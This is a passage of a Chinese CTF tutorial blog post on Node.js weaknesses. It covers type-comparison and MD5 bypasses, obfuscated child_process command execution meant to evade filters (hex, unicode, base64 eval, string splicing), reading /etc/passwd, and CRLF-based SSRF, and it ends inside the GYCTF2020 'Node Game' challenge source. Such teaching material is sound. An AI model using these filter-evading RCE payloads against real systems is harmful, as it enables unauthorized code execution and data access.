string">"5"</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"6"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//56,6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2-3-MD5的绕过"><a href="#1-2-3-MD5的绕过" class="headerlink" title="1.2.3 MD5的绕过"></a>1.2.3 MD5的绕过</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js">a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>a[x]=1&amp;b[x]=2</p><p>数组会被解析成<code>[object Object]</code></p><pre class="line-numbers language-js" data-language="js"><code class="language-js">a<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string-property property">'x'</span><span class="token operator">:</span><span class="token string">'1'</span><span class="token punctuation">&#125;</span>b<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string-property property">'x'</span><span class="token operator">:</span><span class="token string">'2'</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token string">"flag&#123;xxx&#125;"</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token string">"flag&#123;xxx&#125;"</span><span class="token punctuation">)</span>a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>b<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token string">"flag&#123;xxx&#125;"</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token string">"flag&#123;xxx&#125;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2-4-编码绕过"><a href="#1-2-4-编码绕过" class="headerlink" title="1.2.4 编码绕过"></a>1.2.4 编码绕过</h4><p><strong>16进制编码</strong></p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">===</span><span class="token string">"\x61"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>unicode编码</strong></p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"\u0061"</span><span class="token operator">===</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>base编码</strong></p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">eval</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">'Y29uc29sZS5sb2coImhhaGFoYWhhIik7'</span><span class="token punctuation">,</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-3-nodejs危险函数的利用"><a href="#1-3-nodejs危险函数的利用" class="headerlink" title="1.3 nodejs危险函数的利用"></a>1.3 nodejs危险函数的利用</h3><h4 id="1-3-1-nodejs危险函数-命令执行"><a href="#1-3-1-nodejs危险函数-命令执行" class="headerlink" title="1.3.1 nodejs危险函数-命令执行"></a>1.3.1 nodejs危险函数-命令执行</h4><p>exec()</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'open /System/Applications/Calculator.app'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>eval()</p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"document.cookie"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//执行document.cookie</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"document.cookie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//输出document.cookie</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="1-3-2-nodejs危险函数-文件读写"><a href="#1-3-2-nodejs危险函数-文件读写" class="headerlink" title="1.3.2 nodejs危险函数-文件读写"></a>1.3.2 nodejs危险函数-文件读写</h4><p><strong>读</strong></p><p>readFileSync()</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token keyword">throw</span> err<span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>readFile()</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>写</strong></p><p>writeFileSync()</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'input.txt'</span><span class="token punctuation">,</span><span class="token string">'sss'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>writeFile()</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token string">'input.txt'</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-3-3-nodejs危险函数-RCE-bypass"><a href="#1-3-3-nodejs危险函数-RCE-bypass" class="headerlink" title="1.3.3 nodejs危险函数-RCE bypass"></a>1.3.3 nodejs危险函数-RCE bypass</h4><p><strong>bypass</strong></p><p>原型：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'cat flag.txt'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>字符拼接：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'exe'</span><span class="token operator">%</span>2b<span class="token string">'cSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat flag.txt'</span><span class="token punctuation">)</span><span class="token comment">//(%2b就是+的url编码)</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"exe"</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">"cSync"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"open /System/Applications/Calculator.app/"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>编码绕过：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"\x65\x78\x65\x63\x53\x79\x6e\x63"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat flag.txt'</span><span class="token punctuation">)</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat fl001g.txt'</span><span class="token punctuation">)</span><span class="token function">eval</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">'cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwLycpOw=='</span><span class="token punctuation">,</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//弹计算器</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>模板拼接：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">exe</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">cSync</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'open /System/Applications/Calculator.app/'</span>）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其他函数：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"sleep 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">"sleep 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execFile</span><span class="token punctuation">(</span><span class="token string">"/bin/sleep"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"3"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">*</span><span class="token comment">//调用某个可执行文件，在第二个参数传args* </span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">'sleep'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span><span class="token string">'sleep'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execFileSync</span><span class="token punctuation">(</span><span class="token string">'sleep'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-4-nodejs中的ssrf"><a href="#1-4-nodejs中的ssrf" class="headerlink" title="1.4 nodejs中的ssrf"></a>1.4 nodejs中的ssrf</h3><h4 id="1-4-1-通过拆分请求实现的ssrf攻击"><a href="#1-4-1-通过拆分请求实现的ssrf攻击" class="headerlink" title="1.4.1 通过拆分请求实现的ssrf攻击"></a>1.4.1 通过拆分请求实现的ssrf攻击</h4><p><strong>原理</strong></p><p>虽然用户发出的http请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符。相反，这些字符被截断为其JavaScript表示的最低字节</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">></span> v <span class="token operator">=</span> <span class="token string">"/caf\u&#123;E9&#125;\u&#123;01F436&#125;"</span><span class="token string">'/café🐶'</span><span class="token operator">></span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span><span class="token string">'latin1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span><span class="token string">'/café=6'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Crlf HTTP头注入:</strong></p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">></span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'http://example.com/\r\n/test'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_header<span class="token string">'GET //test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>通过crlf结合ssrf利用</strong></p><p>题目连接：</p><p><a href="https://buuoj.cn/challenges#[GYCTF2020]Node%20Game">https://buuoj.cn/challenges#[GYCTF2020]Node%20Game</a></p><p>源码：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 处理文件路径 </span><span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">var</span> pug <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">pug</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 模板渲染 </span><span class="token keyword">var</span> morgan <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'morgan'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 日志 </span><span class="token keyword">const</span> multer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'multer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 用于处理multipart/form-data类型的表单数据，实现上传功能</span><span class="token comment">// 将上传的文件存储在./dist[自动创建]返回一个名为file的文件数组 </span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">dest</span><span class="token operator">:</span> <span class="token string">'./dist'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 使用简化版日志 </span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">morgan</span><span class="token punctuation">(</span><span class="token string">'short'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 静态文件路由 </span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/uploads"</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'/uploads'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/template"</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'/template'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// GET方法获取action参数    </span>  <span class="token keyword">var</span> action <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>action <span class="token operator">?</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>action <span class="token operator">:</span> <span class="token string">"index"</span><span class="token punctuation">;</span>      <span class="token comment">// action中不能包含/ &amp; \    </span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>action<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">||</span> action<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Errrrr, You have been Blocked"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token comment">// 将/template/[action].pug渲染成html输出到根目录    </span>  file <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/template/'</span> <span class="token operator">+</span> action <span class="token operator">+</span> <span class="token string">'.pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> html <span class="token operator">=</span> pug<span class="token punctuation">.</span><span class="token function">renderFile</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>      res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/file_upload'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> ip <span class="token operator">=</span> req<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>remoteAddress<span class="token punctuation">;</span> <span class="token comment">// remoteAddress无法伪造，因为TCP有三次握手，伪造源IP会导致无法完成TCP连接    </span>  <span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>      <span class="token comment">// 请求必须来自localhost    </span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ip<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">"only admin's ip can use it"</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span>      <span class="token punctuation">&#125;</span>      fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>path<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">'upload failed'</span><span class="token punctuation">;</span>                  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                  <span class="token comment">// 文件路径为/uploads/[mimetype]/filename，mimetype可以进行目录穿越实现将文件存储至/template并利用action渲染到界面            </span>      <span class="token keyword">var</span> file_path <span class="token operator">=</span> <span class="token string">'/uploads/'</span> <span class="token operator">+</span> req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mimetype <span class="token operator">+</span> <span class="token string">"/"</span><span class="token punctuation">;</span>                  <span class="token keyword">var</span> file_name <span class="token operator">=</span> req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>originalname                  <span class="token keyword">var</span> dir_file <span class="token operator">=</span> __dirname <span class="token operator">+</span> file_path <span class="token operator">+</span> file_name                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> file_path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                              fs<span class="token punctuation">.</span><span class="token function">mkdirSync</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> file_path<span class="token punctuation">)</span>                        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                              obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">"file type error"</span><span class="token punctuation">;</span>                              res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token keyword">return</span>                        <span class="token punctuation">&#125;</span>                  <span class="token punctuation">&#125;</span>                  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                        fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span>dir_file<span class="token punctuation">,</span> data<span class="token punctuation">)</span>                        obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'upload success'</span><span class="token punctuation">,</span> <span class="token literal-property property">filename</span><span class="token operator">:</span> file_path <span class="token operator">+</span> file_name<span class="token punctuation">&#125;</span>                  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">'upload failed'</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>                  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token comment">// 查看题目源码 </span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/template/source.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/core'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> q <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q<span class="token punctuation">;</span>      <span class="token keyword">var</span> resp <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">'http://localhost:8081/source?'</span> <span class="token operator">+</span> q            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>               <span class="token comment">// 对url字符进行waf        </span>    <span class="token keyword">var</span> trigger <span class="token operator">=</span> <span class="token function">blacklist</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>trigger <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  res<span class="token 